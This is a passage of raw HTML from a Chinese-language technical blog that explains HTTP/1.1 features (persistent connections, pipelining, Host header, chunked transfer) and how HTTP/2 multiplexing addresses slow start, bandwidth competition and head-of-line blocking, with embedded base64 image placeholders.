G994/807am21avkeMKJFfoniJPI8wezFwtv8BMZfV0YV6F0oAAAAASUVORK5CYII=\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 02 06 58" title="" data-src="/static/2021-07-15-02-06-58-3f9309c343330bb9e3c217b9bcca4669-fee1c.png" data-srcset="/static/2021-07-15-02-06-58-3f9309c343330bb9e3c217b9bcca4669-a67b7.png 200w,\n/static/2021-07-15-02-06-58-3f9309c343330bb9e3c217b9bcca4669-0b187.png 400w,\n/static/2021-07-15-02-06-58-3f9309c343330bb9e3c217b9bcca4669-fee1c.png 800w,\n/static/2021-07-15-02-06-58-3f9309c343330bb9e3c217b9bcca4669-54f32.png 1140w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>从上图可以看出，HTTP 的持久连接可以有效减少 TCP 建立连接和断开连接的次数，这样的好处是减少了服务器额外的负担，并提升整体 HTTP 的请求时长。</p>\n<p>持久连接在 HTTP/1.1 中是默认开启的，所以你不需要专门为了持久连接去 HTTP 请求头设置信息，如果你不想要采用持久连接，可以在 HTTP 请求头中加上 Connection: close。目前浏览器中对于同一个域名，默认允许同时建立 6 个 TCP 持久连接。</p>\n<h3 id="不成熟的-http-管线化"><a href="#%E4%B8%8D%E6%88%90%E7%86%9F%E7%9A%84-http-%E7%AE%A1%E7%BA%BF%E5%8C%96" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>不成熟的 HTTP 管线化</h3>\n<p>持久连接虽然能减少 TCP 的建立和断开次数，但是它需要等待前面的请求返回之后，才能进行下一次请求。如果 TCP 通道中的某个请求因为某些原因没有及时返回，那么就会阻塞后面的所有请求，这就是著名的队头阻塞的问题。</p>\n<p>HTTP/1.1 中试图通过管线化的技术来解决队头阻塞的问题。HTTP/1.1 中的管线化是指将多个 HTTP 请求整批提交给服务器的技术，虽然可以整批发送请求，不过服务器依然需要根据请求顺序来回复浏览器的请求。</p>\n<p>FireFox、Chrome 都做过管线化的试验，但是由于各种原因，它们最终都放弃了管线化技术。</p>\n<h3 id="提供虚拟主机的支持"><a href="#%E6%8F%90%E4%BE%9B%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E7%9A%84%E6%94%AF%E6%8C%81" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>提供虚拟主机的支持</h3>\n<p>在 HTTP/1.0 中，每个域名绑定了一个唯一的 IP 地址，因此一个服务器只能支持一个域名。但是随着虚拟主机技术的发展，需要实现在一台物理主机上绑定多个虚拟主机，每个虚拟主机都有自己的单独的域名，这些单独的域名都公用同一个 IP 地址。</p>\n<p>因此，HTTP/1.1 的请求头中增加了 Host 字段，用来表示当前的域名地址，这样服务器就可以根据不同的 Host 值做不同的处理。</p>\n<h3 id="支持动态生成内容"><a href="#%E6%94%AF%E6%8C%81%E5%8A%A8%E6%80%81%E7%94%9F%E6%88%90%E5%86%85%E5%AE%B9" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>支持动态生成内容</h3>\n<p>在设计 HTTP/1.0 时，需要在响应头中设置完整的数据大小，如 Content-Length: 901，这样浏览器就可以根据设置的数据大小来接收数据。不过随着服务器端的技术发展，很多页面的内容都是动态生成的，因此在传输数据之前并不知道最终的数据大小，这就导致了浏览器不知道何时会接收完所有的文件数据。</p>\n<p>HTTP/1.1 通过引入 Chunk transfer 机制来解决这个问题，服务器会将数据分割成若干个任意大小的数据块，每个数据块发送时会附上上个数据块的长度，最后使用一个零长度的块作为发送数据完成的标志。这样就提供了对动态内容的支持。</p>\n<h3 id="客户端-cookie、安全机制"><a href="#%E5%AE%A2%E6%88%B7%E7%AB%AF-cookie%E3%80%81%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>客户端 Cookie、安全机制</h3>\n<p>除此之外，HTTP/1.1 还引入了客户端 Cookie 机制和安全机制。</p>\n<h2 id="总结"><a href="#%E6%80%BB%E7%BB%93" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>总结</h2>\n<p>本文我们重点强调了 HTTP 是浏览器和服务器的通信语言，然后我们从需求演变的角度追溯了 HTTP 的发展史，在诞生之初的 HTTP/0.9 因为需求简单，所以和服务器之间的通信过程也相对简单。</p>\n<p>由于万维网的快速崛起，带来了大量新的需求，其中最核心的一个就是需要支持多种类型的文件下载， 为此 HTTP/1.0 中引入了请求头和响应头。在支持多种类型文件下载的基础之上，HTTP/1.0 还提供了 Cache 机制、用户代理、状态码等一些基础信息。</p>\n<p>但随着技术和需求的发展，人们对文件传输的速度要求越来越高，故又基于 HTTP/1.0 推出了 HTTP/1.1，增加了持久连接方法来提升连接效率，同时还尝试使用管线化技术提升效率（不过由于各种原因，管线化技术最终被各大厂商放弃了）。除此之外，HTTP/1.1 还引入了 Cookie、虚拟主机的支持、对动态内容的支持等特性。</p>\n<p>虽然 HTTP/1.1 在 HTTP/1.0 的基础之上做了大量的优化，但是由于一些效率问题始终很难解决，所以最终还是被 HTTP/2 所取代，这就是我们下一篇文章要介绍的内容了</p>\n<h1 id="http2：如何提升网络速度"><a href="#http2%EF%BC%9A%E5%A6%82%E4%BD%95%E6%8F%90%E5%8D%87%E7%BD%91%E7%BB%9C%E9%80%9F%E5%BA%A6" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>HTTP2：如何提升网络速度</h1>\n<p>上一篇文章我们聊了 HTTP/1.1 的发展史，虽然 HTTP/1.1 已经做了大量的优化，但是依然存在很多性能瓶颈，依然不能满足我们日益变化的新需求，所以就有了我们今天要聊的 HTTP/2。</p>\n<p>本文我们依然从需求的层面来谈，先分析 HTTP/1.1 存在哪些问题，然后再来分析 HTTP/2 是如何解决这些问题的。</p>\n<p>我们知道 HTTP/1.1 为网络效率做了大量的优化，最核心的有如下三种方式：</p>\n<ul>\n<li>增加了持久连接；</li>\n<li>浏览器为每个域名最多同时维护 6 个 TCP 持久连接；</li>\n<li>使用 CDN 的实现域名分片机制。</li>\n</ul>\n<p>通过这些方式就大大提高了页面的下载速度，你可以通过下图来直观感受下：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-13-41-25-d156a132ddc5d62de6cb4f95fe5674a3-18aad.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 94.72%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAIAAAAf7rriAAAACXBIWXMAAAsSAAALEgHS3X78AAACqElEQVQ4y52T60/TUBjG+Z/0g9FESTRoNJGbEhWFj0YiiYlfjDEhxkg0giiTeze3DIRMxWgkyB3GIEQuIcFsbEBkXde1XS/nrGvXbt2pp0AdEkzQX94m7/nw5Jz3eZ8WmaaZR6ZuWKUZpoHMo1OEv8Vots6Xuv9Jvj0g+74DBfJJXrDBnSjwnDhPiOPPxMkmcapZGG3UmdCeeGZDv9wNrrnhpW65dYQmt0Kh9bAN7iKR0I+Yu5pynKY6Sqj2EvLlCTUysSee3dSvOEGtF5YT0BWQ8M1ckrexHsGzdOL9XW6wXppu4Ycb6J5SdXOmIK50ghovLCNSXVNcko5uR0mbKBmLkT83Kc8tynGG6ryA6+DNu2L8+L5F1TRRzsjb4A4ZOT21MgD8DhBoB3Md0kxrNrnxh7i21xK/W8rs+n9Ut/14Zhd48EWucoG+Je0QMcpnthfSwWFcSuibsj5ipJiD4gon9CzIZj6jqBkbNaPpahrSnmqaKGN9d5i+2mjTcSU8XhBXvQXNk0qFE/TuzJzN7ZsZmUZWS359yA3e44cf80OPEt6b+CEF8VUXaBhKlxN/nxkZKKehrIqyGZTP4bNt2JZl2HW3ZVj/svZvhu257YWlPdA9D3MqlAC0wV0KSqI03yOOPRXHn4sTL4TRJzoTPCQkhF+AQoJOMDYJhmWZOBn33Ii9PkW1nYs5iqNNx5SwHZLAlo6XhPdc6ZLbxujtjWAwtG6Du3A4uBYfqOM+1ovTLcJYI+2qLMRzMqKfb5cqCHD2DeiYEtISx7CcDcslk1yCintrKEcxzma8+yL56qTyO56kaHxYzXxe03yr2kpU1VRZltM2uFPSKQiX+8FsGwh0grlOyb8vnv+NJUbI2s1u4R3pug4AwLezO2DT8J+J8nkc0n1lLfMXHmTXjbpdbl0AAAAASUVORK5CYII=\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 13 41 25" title="" data-src="/static/2021-07-15-13-41-25-d156a132ddc5d62de6cb4f95fe5674a3-fee1c.png" data-srcset="/static/2021-07-15-13-41-25-d156a132ddc5d62de6cb4f95fe5674a3-a67b7.png 200w,\n/static/2021-07-15-13-41-25-d156a132ddc5d62de6cb4f95fe5674a3-0b187.png 400w,\n/static/2021-07-15-13-41-25-d156a132ddc5d62de6cb4f95fe5674a3-fee1c.png 800w,\n/static/2021-07-15-13-41-25-d156a132ddc5d62de6cb4f95fe5674a3-b1a91.png 1200w,\n/static/2021-07-15-13-41-25-d156a132ddc5d62de6cb4f95fe5674a3-18aad.png 1250w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>在该图中，引入了 CDN，并同时为每个域名维护 6 个连接，这样就大大减轻了整个资源的下载时间。这里我们可以简单计算下：如果使用单个 TCP 的持久连接，下载 100 个资源所花费的时间为 <code class="language-text">100*RTT</code>；若通过上面的技术，就可以把整个时间缩短为 <code class="language-text">100*RTT/(6*CDN个数)</code>。从这个计算结果来看，我们的页面加载速度变快了不少</p>\n<h2 id="http11-的主要问题"><a href="#http11-%E7%9A%84%E4%B8%BB%E8%A6%81%E9%97%AE%E9%A2%98" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>HTTP/1.1 的主要问题</h2>\n<p>虽然 HTTP/1.1 采取了很多优化资源加载速度的策略，也取得了一定的效果，但是 HTTP/1.1 对带宽的利用率却并不理想，这也是 HTTP/1.1 的一个核心问题。</p>\n<p>带宽是指每秒最大能发送或者接收的字节数。我们把每秒能发送的最大字节数称为上行带宽，每秒能够接收的最大字节数称为下行带宽。</p>\n<p>之所以说 HTTP/1.1 对带宽的利用率不理想，是因为 HTTP/1.1 很难将带宽用满。比如我们常说的 100M 带宽，实际的下载速度能达到 12.5M/S，而采用 HTTP/1.1 时，也许在加载页面资源时最大只能使用到 2.5M/S，很难将 12.5M 全部用满。</p>\n<p>之所以会出现这个问题，主要是由以下三个原因导致的。</p>\n<h3 id="tcp-的慢启动"><a href="#tcp-%E7%9A%84%E6%85%A2%E5%90%AF%E5%8A%A8" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>TCP 的慢启动</h3>\n<p>一旦一个 TCP 连接建立之后，就进入了发送数据状态，刚开始 TCP 协议会采用一个非常慢的速度去发送数据，然后慢慢加快发送数据的速度，直到发送数据的速度达到一个理想状态，我们把这个过程称为慢启动。</p>\n<p>你可以把每个 TCP 发送数据的过程看成是一辆车的启动过程，当刚进入公路时，会有从 0 到一个稳定速度的提速过程，TCP 的慢启动就类似于该过程。</p>\n<p>慢启动是 TCP 为了减少网络拥塞的一种策略，我们是没有办法改变的。</p>\n<p>而之所以说慢启动会带来性能问题，是因为页面中常用的一些关键资源文件本来就不大，如 HTML 文件、CSS 文件和 JavaScript 文件，通常这些文件在 TCP 连接建立好之后就要发起请求的，但这个过程是慢启动，所以耗费的时间比正常的时间要多很多，这样就推迟了宝贵的首次渲染页面的时长了。</p>\n<h3 id="tcp-连接竞争带宽"><a href="#tcp-%E8%BF%9E%E6%8E%A5%E7%AB%9E%E4%BA%89%E5%B8%A6%E5%AE%BD" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>TCP 连接竞争带宽</h3>\n<p>你可以想象一下，系统同时建立了多条 TCP 连接，当带宽充足时，每条连接发送或者接收速度会慢慢向上增加；而一旦带宽不足时，这些 TCP 连接又会减慢发送或者接收的速度。比如一个页面有 200 个文件，使用了 3 个 CDN，那么加载该网页的时候就需要建立 6 * 3，也就是 18 个 TCP 连接来下载资源；在下载过程中，当发现带宽不足的时候，各个 TCP 连接就需要动态减慢接收数据的速度。</p>\n<p>这样就会出现一个问题，因为有的 TCP 连接下载的是一些关键资源，如 CSS 文件、JavaScript 文件等，而有的 TCP 连接下载的是图片、视频等普通的资源文件，但是多条 TCP 连接之间又不能协商让哪些关键资源优先下载，这样就有可能影响那些关键资源的下载速度了。</p>\n<h3 id="http11-队头阻塞"><a href="#http11-%E9%98%9F%E5%A4%B4%E9%98%BB%E5%A1%9E" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>HTTP/1.1 队头阻塞</h3>\n<p>通过上一篇文章，我们知道在 HTTP/1.1 中使用持久连接时，虽然能公用一个 TCP 管道，但是在一个管道中同一时刻只能处理一个请求，在当前的请求没有结束之前，其他的请求只能处于阻塞状态。这意味着我们不能随意在一个管道中发送请求和接收内容。</p>\n<p>这是一个很严重的问题，因为阻塞请求的因素有很多，并且都是一些不确定性的因素，假如有的请求被阻塞了 5 秒，那么后续排队的请求都要延迟等待 5 秒，在这个等待的过程中，带宽、CPU 都被白白浪费了。</p>\n<p>在浏览器处理生成页面的过程中，是非常希望能提前接收到数据的，这样就可以对这些数据做预处理操作，比如提前接收到了图片，那么就可以提前进行编解码操作，等到需要使用该图片的时候，就可以直接给出处理后的数据了，这样能让用户感受到整体速度的提升。</p>\n<p>但队头阻塞使得这些数据不能并行请求，所以队头阻塞是很不利于浏览器优化的。</p>\n<h2 id="http2-的多路复用"><a href="#http2-%E7%9A%84%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>HTTP/2 的多路复用</h2>\n<p>前面我们分析了 HTTP/1.1 所存在的一些主要问题：慢启动和 TCP 连接之间相互竞争带宽是由于 TCP 本身的机制导致的，而队头阻塞是由于 HTTP/1.1 的机制导致的。</p>\n<p>那么该如何去解决这些问题呢？</p>\n<p>虽然 TCP 有问题，但是我们依然没有换掉 TCP 的能力，所以我们就要想办法去规避 TCP 的慢启动和 TCP 连接之间的竞争问题。</p>\n<p>基于此，HTTP/2 的思路就是一个域名只使用一个 TCP 长连接来传输数据，这样整个页面资源的下载过程只需要一次慢启动，同时也避免了多个 TCP 连接竞争带宽所带来的问题。</p>\n<p>另外，就是队头阻塞的问题，等待请求完成后才能去请求下一个资源，这种方式无疑是最慢的，所以 HTTP/2 需要实现资源的并行请求，也就是任何时候都可以将请求发送给服务器，而并不需要等待其他请求的完成，然后服务器也可以随时返回处理好的请求资源给浏览器。</p>\n<p>所以，HTTP/2 的解决方案可以总结为：一个域名只使用一个 TCP 长连接和消除队头阻塞问题。可以参考下图：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-14-09-42-3caa2941d04a68b682553434a09b10ef-0d494.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 47.267759562841526%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsSAAALEgHS3X78AAABwElEQVQoz32RXU/TYBTH93nwO/gBvNKQYACv5I5Lv4C8LGg0LgImShkgYBgv6hyWMeImZZLIS9w6tnajc+1Wlm0wNgp71qdP+7xAEe/Ek19Ozs0vOef8PeyWwoQhzAhl/ynPKaQbqvNNczQD0/MSqErtmgxqcqOUKIibzVLyam4fZ1uVNDG0ooHnZSeQxb9qxJWzDdq9QR+EaVBqmdKSKXKVH+NiaLgcH81FXmjffVL4WSH66mB1qL4/u6kYnSGrKwQXcu5KHumC+UYWJwbfxSs209YvEpP1vUk9/qa+yx3/pbrD6cLrVmY5WWcDH396V4Sgglw517R7Xw4HIoPpkzOmR0GSg5k5KzML0zNmYgKKnNtTU/BgmpX4VIN5l4WRpeiXQ9OVlSZ7vF7ujxb5rEl/rx5GnhdivnxsVF17KnvvFMbuyt4O1X8fpKaN5PxW/uxR2O75aq0oNzeTbh7f+0zCisn0WF54W9z2H+2817fGFf9D9UOfOtVVDj4x0gFT4cUa7uVRD48+KY4rn1tsu4yFI6cKKKMOdhD5A7YpwS4UE+xgGzFiA5tJp/SKk/b1w/4dMsYIIcuyAAAQwttyvgQpmMs9AgwXyAAAAABJRU5ErkJggg==\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 14 09 42" title="" data-src="/static/2021-07-15-14-09-42-3caa2941d04a68b682553434a09b10ef-fee1c.png" data-srcset="/static/2021-07-15-14-09-42-3caa2941d04a68b682553434a09b10ef-a67b7.png 200w,\n/static/2021-07-15-14-09-42-3caa2941d04a68b682553434a09b10ef-0b187.png 400w,\n/static/2021-07-15-14-09-42-3caa2941d04a68b682553434a09b10ef-fee1c.png 800w,\n/static/2021-07-15-14-09-42-3caa2941d04a68b682553434a09b10ef-b1a91.png 1200w,\n/static/2021-07-15-14-09-42-3caa2941d04a68b682553434a09b10ef-0d494.png 1464w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>该图就是 HTTP/2 最核心、最重要且最具颠覆性的多路复用机制。从图中你会发现每个请求都有一个对应的 ID，如 stream1 表示 index.html 的请求，stream2 表示 foo.css 的请求。这样在浏览器端，就可以随时将请求发送给服务器了。</p>\n<p>服务器端接收到这些请求后，会根据自己的喜好来决定优先返回哪些内容，比如服务器可能早就缓存好了 index.html 和 bar.js 的响应头信息，那么当接收到请求的时候就可以立即把 index.html 和 bar.js 的响应头信息返回给浏览器，然后再将 index.html 和 bar.js 的响应体数据返回给浏览器。之所以可以随意发送，是因为每份数据都有对应的 ID，浏览器接收到之后，会筛选出相同 ID 的内容，将其拼接为完整的 HTTP 响应数据。</p>\n<p>HTTP/2 使用了多路复用技术，可以将请求分成一帧一帧的数据去传输，这样带来了一个额外的好处，就是当收到一个优先级高的请求时，比如接收到 JavaScript 或者 CSS 关键资源的请求，服务器可以暂停之前的请求来优先处理关键资源的请求</p>\n<h2 id="多路复用的实现"><a href="#%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E7%9A%84%E5%AE%9E%E7%8E%B0" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>多路复用的实现</h2>\n<p>现在我们知道为了解决 HTTP/1.1 存在的问题，HTTP/2 采用了多路复用机制，那 HTTP/2 是怎么实现多路复用的呢？你可以先看下面这张图：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-14-10-11-087266f99c6858c306ea1952ba3e80e1-09eb7.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 101.22591943957968%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAIAAAAC64paAAAACXBIWXMAAAsSAAALEgHS3X78AAADQklEQVQ4y12S3W/bVBjGH8uI1YBQYMpS6NAEV9BuEuJ6QdodICFBK273fyChbiv9SNombdK0TZvm06XhopqgEhegCk1DCFW75AYNVuhix/lo7diJ7Xz6cE6+GrB+Pnrfx37s9z3vASGk0+lU1XxVlYfUVNnUZOOCBbURnXEhWUaZdC/Q29aLauj1duTFZuSlZkRoRQQ7LJzOC0/nGLklob0pUJ2x+Up7Hdq3H9U71Ocwc8MoaAHBXoW5ylkBUGorOF+C5kN5EaVFWKvo6XaQt33QD+5cmpvVorQkGMswg5y+AjOA3NfQltFYQzuEsg+5OdhrMFYpvDqPc/FO49JsFJQlQbqP01nu7D6qy5AfoBZAJwSywb7y9yzkOfz5FZR5XpvDxX/M1fJp4EY+4JYD40rQU1z3PPN7Tv0eZc1D07/8LKWxHPQUQm/mfC8r2emmMzBbevFs6315811pa0ranKQo25PF6GRhmwWlHRYwfYtyUw7dkA7vXv7ZVCV7/QoJg4Q5utL9pP0/f8BKVX2gjRQX0H0KZ4MnQVQPvHZ7YLZVqR0eo+2RDY6t9KUACrNQ6T75ULgHfRHdpyARnqyhlvXWh2ajUv4x+sVx9LPj6Oc9ft6dfrw38zg+8yg280t8+tFuXz/emfkp8vGvh1+2OoNDImnWWKyBOOHiBD1iDnY6iHbYukvTvs4nHJp6H9ZIy3Z6Zlkzx9I2RMKJBKKDfYJEHcFnWHmK0HMs/4GEzUSR8PsOUuTDo+qlOV+xxlPaqxn7tYzl6iHarlTNlaq6kjojbfb0q6L1QrL+yZFK2vW+WamY78TO3tgrXN9TJobECxOJ0kSiyIKB+FZccUUL0w9zpN1wBj2bYykbGcJlCHrQ+pNNhPKIlDEUM4SnTSWJ9/uRspk5aSNNuDTBkJSDLQ3bFYyIfMZBgni/GzEXdfOD1D/vpfM30/LUKN+cT+2XRpVbGfntuHz3iJbdHPZsXd83rh40rx003EOyLXe85E5V3NnmUBz